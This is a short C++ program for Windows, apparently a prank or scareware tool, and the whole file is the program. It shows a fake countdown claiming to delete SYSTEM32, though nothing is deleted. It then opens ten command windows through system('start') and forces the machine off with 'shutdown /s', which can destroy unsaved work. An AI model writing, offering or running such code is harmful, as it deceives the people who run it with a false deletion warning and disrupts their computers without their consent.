#include <iostream>
#include <Windows.h>

using namespace std;

void main()
{
	int a = 5;
	for (int i = 0; i < 5; i++)
	{
		cout << "Deleting SYSTEM32 in "<< a << endl;
		Sleep(400);
		a--;
	}
	for (int i = 0; i < 10; i++)
	{
		system("start");
	}
	system("C:\\Windows\\System32\\shutdown /s");
}